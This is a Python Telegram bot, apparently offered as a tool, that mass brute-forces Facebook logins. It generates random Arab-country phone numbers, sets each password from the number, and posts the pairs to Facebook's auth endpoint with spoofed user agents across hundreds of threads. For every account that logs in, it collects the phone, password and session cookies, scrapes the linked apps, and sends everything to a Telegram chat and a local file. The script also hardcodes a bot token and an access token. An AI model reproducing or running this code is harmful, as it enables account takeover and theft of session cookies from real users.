#!/usr/bin/env python3
import asyncio
import os,random
import re
import json
import time
import sys
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from threading import Lock, Thread
from datetime import datetime
import httpx
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, constants
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

BOT_TOKEN = "8900820138:AAEWhKDQLljmnfkt0o8iBaGVOuhe6Xvm3qk"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
MAX_WORKERS = 500
BATCH_SIZE = 200
UPDATE_INTERVAL = 2

async_client = httpx.AsyncClient(timeout=httpx.Timeout(60.0, connect=30.0), verify=False, http2=True, follow_redirects=True)

def emoji(emoji_id, fallback):
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'

E_IRAQ = emoji("5911382442622587735", "🇮🇶")
E_PALESTINE = emoji("5911346652660110556", "🇵🇸")
E_EGYPT = emoji("5913694831539916769", "🇪🇬")
E_SAUDI = emoji("5911300687920108242", "🇸🇦")
E_JORDAN = emoji("5913234136167878475", "🇯🇴")
E_SYRIA = emoji("5775898631278171850", "🇸🇾")
E_LEBANON = emoji("5911504273664905447", "🇱🇧")
E_MOROCCO = emoji("5913684768431541668", "🇲🇦")
E_ALGERIA = emoji("5913782968563800236", "🇩🇿")
E_TUNISIA = emoji("5911260864983339619", "🇹🇳")
E_LIBYA = emoji("5778447196152142000", "🇱🇾")
E_SUDAN = emoji("5911387497799094470", "🇸🇩")
E_YEMEN = emoji("5913290705182134003", "🇾🇪")
E_KUWAIT = emoji("5913766918271012920", "🇰🇼")
E_UAE = emoji("5775879458544162632", "🇦🇪")
E_QATAR = emoji("5911260864983339619", "🇶🇦")
E_BAHRAIN = emoji("5775949822993371030", "🇧🇭")
E_OMAN = emoji("5913766918271012920", "🇴🇲")
E_SADDAM = emoji("5778447196152142000", "😎")
E_FUNNY = emoji("5775898631278171850", "😂")
E_LAUGH = emoji("5775879458544162632", "🤣")

COUNTRY_EMOJIS = {
    "1": ("5911382442622587735", "🇮🇶"), "2": ("5911346652660110556", "🇵🇸"),
    "3": ("5913694831539916769", "🇪🇬"), "4": ("5911300687920108242", "🇸🇦"),
    "5": ("5913234136167878475", "🇯🇴"), "6": ("5778447196152142000", "🇸🇾"),
    "7": ("5911504273664905447", "🇱🇧"), "8": ("5913684768431541668", "🇲🇦"),
    "9": ("5913782968563800236", "🇩🇿"), "10": ("5911260864983339619", "🇹🇳"),
    "11": ("5911236989260140996", "🇱🇾"), "12": ("5911387497799094470", "🇸🇩"),
    "13": ("5913290705182134003", "🇾🇪"), "14": ("5913766918271012920", "🇰🇼"),
    "15": ("5913726554168365343", "🇦🇪"), "16": ("5911260864983339619", "🇶🇦"),
    "17": ("5913581663446634403", "🇧🇭"), "18": ("5913766918271012920", "🇴🇲")
}

UAS = [
    "[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/514131552;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/399995170]",
    "[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/319594965;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/276356168]",
    "[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/115110161;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/137131975]",
    "Dalvik/2.1.0 (Linux; U; Android 13; TECNO CI8n Build/TP1A.220624.014) [FBAN/ViewpointsForAndroid;FBAV/317.0.0.2.108]",
    "Dalvik/2.1.0 (Linux; U; Android 14; TECNO CK7n Build/UP1A.231005.007) [FBAN/ViewpointsForAndroid;FBAV/582.0.0.1.554]",
    "Dalvik/2.1.0 (Linux; U; Android 15; TECNO KM4 Build/AP3A.240905.015.A2) [FBAN/ViewpointsForAndroid;FBAV/317.0.0.2.108]","[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/543547403;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/320482287]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/419016998;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/563248858]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/409053898;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/217006269]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/281917743;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/243389064]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/106226821;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/206246598]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/122233899;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/290328836]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/644051640;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/622721473]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/175965357;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/347474731]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/467761383;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/541759969]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/284499948;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/114121735]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/254547110;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/404946131]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/570216180;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/546669880]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/450410062;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/411309625]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/595496594;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/249496586]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/245893179;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/210195029]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/265924712;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/492236841]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/381737866;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/362338345]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/490093743;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/163305870]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/289357630;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/104928646]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/213906300;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/526588336]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/589105393;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/336456362]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/581042385;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/656469065]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/342785366;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/489164503]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/471148626;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/156974102]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/396659072;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/422877215]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/365730818;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/504207824]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/666385533;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/303569572]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/620307680;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/119771128]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/296986402;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/102639926]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/112775378;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/649812079]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/247426110;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/660375771]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/499478371;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/699973544]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/406098608;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/481620652]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/260426252;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/354216297]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/538022838;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/324533649]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/540648617;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/301762101]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/626884467;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/223281093]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/476416818;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/291219945]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/388611009;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/229125825]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/408557118;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/187376901]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/673566815;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/377734854]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/668735515;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/377184962]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/502663737;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/476711016]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/683535718;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/458675428]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/126131813;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/518537251]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/682872480;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/572596965]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/371383274;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/557182843]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/624741626;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/494423185]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/437713275;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/237532777]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/208385885;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/563043526]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/671260515;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/620973252]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/632818727;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/394338148]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/662382378;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/315750194]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/281527587;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/115894418]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/190348513;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/676319824]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/622513143;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/272487269]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/230064526;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/544360607]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/182826725;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/153114256]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/110353103;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/165153781]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/424961107;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/352759095]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/310031373;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/689952586]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/402817333;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/128034491]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/210000243;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/195755313]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/268369143;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/276957218]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/164647508;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/432714134]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/337688574;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/429432536]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/152562689;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/665042236]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/508154040;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/493380075]"
]

user_sessions = {}

class CheckerSession:
    def __init__(self, user_id):
        self.user_id = user_id
        self.hit = 0
        self.cp = 0
        self.bad = 0
        self.processed = 0
        self.is_running = False
        self.progress_msg_id = None
        self.start_time = 0
        self.last_progress_text = ""
        self.country = "1"
        self.last_response = ""
        self.lock = Lock()

def gen_phone(country):
    countries = {
        "1": {"code": "964", "prefixes": ["0750","0751","0752","0770","0771","0772","0773","0774","0775","0780","0781","0782","0783","0784","0790","0791","0792","0793","0794"], "length": 7},
        "2": {"code": "970", "prefixes": ["056","059"], "length": 7},
        "3": {"code": "20", "prefixes": ["010","011","012","015"], "length": 8},
        "4": {"code": "966", "prefixes": ["050","053","054","055","056","057","058","059"], "length": 8},
        "5": {"code": "962", "prefixes": ["077","078","079"], "length": 7},
        "6": {"code": "963", "prefixes": ["093","094","095","096","098","099"], "length": 7},
        "7": {"code": "961", "prefixes": ["03","70","71","76","78","79","81"], "length": 6},
        "8": {"code": "212", "prefixes": ["06","07"], "length": 8},
        "9": {"code": "213", "prefixes": ["05","06","07"], "length": 8},
        "10": {"code": "216", "prefixes": ["20","21","22","23","24","25","26","27","28","29","50","51","52","53","54","55","56","57","58","59","90","91","92","93","94","95","96","97","98","99"], "length": 6},
        "11": {"code": "218", "prefixes": ["091","092","093","094","095"], "length": 7},
        "12": {"code": "249", "prefixes": ["09","01"], "length": 8},
        "13": {"code": "967", "prefixes": ["070","071","073","077","078"], "length": 7},
        "14": {"code": "965", "prefixes": ["050","055","060","065","066","067","069","090","094","097","099"], "length": 7},
        "15": {"code": "971", "prefixes": ["050","052","054","055","056","058"], "length": 7},
        "16": {"code": "974", "prefixes": ["030","033","050","055","066","070","074","077"], "length": 6},
        "17": {"code": "973", "prefixes": ["030","033","034","036","037","039","060","063","066","067","069","070","073","076","077","079","080","083","086","087","089","090","093","094","096","097","099"], "length": 6},
        "18": {"code": "968", "prefixes": ["071","072","077","078","079","090","091","092","093","094","095","096","097","098","099"], "length": 6},
        "19": {"code": "random", "prefixes": [], "length": 0}
    }
    if country == "19":
        country = str(random.randint(1, 18))
    c = countries[country]
    prefix = random.choice(c["prefixes"])
    phone = c["code"] + prefix[1:] + ''.join(random.choice('1234567890') for _ in range(c["length"]))
    pas = '0' + phone[3:]
    return phone, pas

def get_apps(cookie_string):
    apps, dates, apps2, dates2 = [], [], [], []
    if not cookie_string:
        return apps, dates, apps2, dates2
    try:
        session = requests.Session()
        coki = {}
        for hh in cookie_string.split(';'):
            if '=' in hh:
                key, val = hh.split('=', 1)
                coki[key.strip()] = val.strip()
        headers = {'user-agent': 'NokiaX2-01/5.0'}
        rr1 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', cookies=coki, headers=headers, timeout=10).text
        apps = re.findall(r'data-testid="app_info_text">([^<]+)</span>', rr1)
        dates = re.findall(r'Added on\s*([^<]+)</p>', rr1)
        rr2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', cookies=coki, headers=headers, timeout=10).text
        apps2 = re.findall(r'data-testid="app_info_text">([^<]+)</span>', rr2)
        dates2_raw = re.findall(r'<p class=".*?">(?:Kedaluwarsa pada|انتهت الصلاحية في)[^<]+</p>', rr2)
        dates2 = [re.sub(r'<[^>]+>', '', d).strip() for d in dates2_raw]
    except:
        pass
    return apps, dates, apps2, dates2

def check_account_core(phone, pas):
    import requests as req
    url = "https://b-graph.facebook.com/auth/login"
    u = random.choice(UAS)
    data = {
        "locale": "en_GB", "format": "json", "email": phone, "password": pas,
        "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
        "generate_session_cookies": 1
    }
    headers = {
        'Host': 'graph.facebook.com', 'User-Agent': u,
        'Content-Type': 'application/json;charset=utf-8',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'origin': 'https://www.facebook.com',
        'referer': 'https://www.facebook.com/?_rdr',
        'upgrade-insecure-requests': '1'
    }
    try:
        response = req.post(url, data=json.dumps(data), headers=headers, timeout=15).json()
        return response
    except:
        return {}

async def send_colored_buttons(chat_id, text, buttons, message_id=None):
    inline_keyboard = []
    for row in buttons:
        keyboard_row = []
        for btn in row:
            btn_dict = {"text": btn["text"], "callback_data": btn["callback_data"]}
            if "style" in btn: btn_dict["style"] = btn["style"]
            if "icon_custom_emoji_id" in btn: btn_dict["icon_custom_emoji_id"] = btn["icon_custom_emoji_id"]
            keyboard_row.append(btn_dict)
        inline_keyboard.append(keyboard_row)
    
    reply_markup = {"inline_keyboard": inline_keyboard}
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML", "reply_markup": reply_markup}
    if message_id:
        payload["message_id"] = message_id
        url = API_URL + "editMessageText"
    else:
        url = API_URL + "sendMessage"
    
    try:
        response = await async_client.post(url, json=payload, timeout=60.0)
        return response.json()
    except:
        return None

def build_country_buttons():
    countries = [
        ("1", "5911382442622587735", "العراق"), ("2", "5911346652660110556", "فلسطين"),
        ("3", "5913694831539916769", "مصر"), ("4", "5911300687920108242", "السعودية"),
        ("5", "5913234136167878475", "الاردن"), ("6", "5778447196152142000", "سوريا"),
        ("7", "5911504273664905447", "لبنان"), ("8", "5913684768431541668", "المغرب"),
        ("9", "5913782968563800236", "الجزائر"), ("10", "5911260864983339619", "تونس"),
        ("11", "5911236989260140996", "ليبيا"), ("12", "5911387497799094470", "السودان"),
        ("13", "5913290705182134003", "اليمن"), ("14", "5913766918271012920", "الكويت"),
        ("15", "5913726554168365343", "الامارات"), ("16", "5911260864983339619", "قطر"),
        ("17", "5913581663446634403", "البحرين"), ("18", "5913766918271012920", "عمان"),
    ]
    buttons = []
    for i in range(0, len(countries), 2):
        row = []
        for j in range(2):
            if i+j < len(countries):
                cid, eid, name = countries[i+j]
                row.append({"text": name, "callback_data": f"c_{cid}", "icon_custom_emoji_id": eid})
        buttons.append(row)
    buttons.append([{"text": "جميع الدول", "callback_data": "c_19", "icon_custom_emoji_id": "5445023138297447592"}])
    return buttons

def build_main_buttons():
    return [
        [{"text": "بدء الصيد", "callback_data": "start_hunt", "style": "danger", "icon_custom_emoji_id": "5445023138297447592"}],
        [{"text": "تغيير الدولة", "callback_data": "change_country", "style": "primary", "icon_custom_emoji_id": "5447510826304959724"}],
        [{"text": "Stop", "callback_data": "stop_hunt", "style": "danger", "icon_custom_emoji_id": "5870734657384877785"}],
        [{"text": "Accounts ", "callback_data": "balance", "style": "success", "icon_custom_emoji_id": "5325610261351003773"},
         {"text": "Dev ", "callback_data": "my_account", "style": "primary", "icon_custom_emoji_id": "5325589250370990568"}],
        [{"text": "information", "callback_data": "info_menu", "style": "primary", "icon_custom_emoji_id": "5328319423642104853"}],
    ]

def format_stats(session):
    names = {"1":"العراق","2":"فلسطين","3":"مصر","4":"السعودية","5":"الاردن","6":"سوريا","7":"لبنان","8":"المغرب","9":"الجزائر","10":"تونس","11":"ليبيا","12":"السودان","13":"اليمن","14":"الكويت","15":"الامارات","16":"قطر","17":"البحرين","18":"عمان","19":"عشوائي"}
    eid, fb = COUNTRY_EMOJIS.get(session.country, ("5911382442622587735", "🇮🇶"))
    e_country = emoji(eid, fb)
    e_saddam = emoji("5778447196152142000", "😎")
    return f"""OK: {session.hit} | CP: {session.cp} | BAD: {session.bad}

الدولة: {e_country} {names.get(session.country, '?')}
response={session.last_response}
Dev: @salhpy {e_saddam}"""

async def update_progress(session, bot, chat_id):
    while session.is_running:
        text = format_stats(session)
        if text != session.last_progress_text:
            buttons = [[{"text": "ايقاف الصيد", "callback_data": "stop_hunt", "style": "danger", "icon_custom_emoji_id": "5870734657384877785"}]]
            try:
                await send_colored_buttons(chat_id, text, buttons, message_id=session.progress_msg_id)
                session.last_progress_text = text
            except:
                pass
        await asyncio.sleep(UPDATE_INTERVAL)

async def run_hunt(session, bot, chat_id):
    session.is_running = True
    session.start_time = time.time()
    session.hit = 0
    session.cp = 0
    session.bad = 0
    fc = "/storage/emulated/0/Salh/Facebook"
    os.makedirs(fc, exist_ok=True)
    
    loop = asyncio.get_running_loop()
    executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
    
    async def hunt_loop():
        while session.is_running:
            phone, pas = gen_phone(session.country)
            future = loop.run_in_executor(executor, check_account_core, phone, pas)
            response = await future
            session.last_response = str(response)
            
            if "session_key" in response:
                session.hit += 1
                try:
                    idd = response.get("uid") or response.get('error', {}).get('error_data', {}).get('uid')
                    cookie_string = '; '.join([f"{c['name']}={c['value']}" for c in response['session_cookies']])
                    apps, dates, apps2, dates2 = get_apps(cookie_string)
                    
                    msg = f"""ACCUONT OK
phone: {phone}
pas: {pas}
DEV: @salhpy
link: https://www.facebook.com/profile.php?id={idd}
cookies: {cookie_string}
app: {apps} | {dates}
{apps2} | {dates2}
Brother: @Xvxsa
BY https://t.me/S_S_lN
DEV @salhpy

Response: {json.dumps(response)}"""
                    await bot.send_message(chat_id=chat_id, text=msg)
                    
                    with open(f"{fc}/Salh_Ok.txt", 'a') as f:
